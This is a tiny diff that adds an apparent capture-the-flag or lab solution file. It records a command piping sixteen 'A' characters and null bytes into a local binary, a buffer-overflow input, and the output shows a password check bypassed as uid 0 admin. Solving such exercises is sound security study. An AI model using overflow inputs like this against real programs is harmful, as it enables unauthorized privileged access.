@@ -1,0 +1,4 @@
+command: echo -n "AAAAAAAAAAAAAAAA\x00\x00\x00\x00" | ./a.out >> ../solution.txt
+
+enter password: uid: 0
+you are logged in as admin
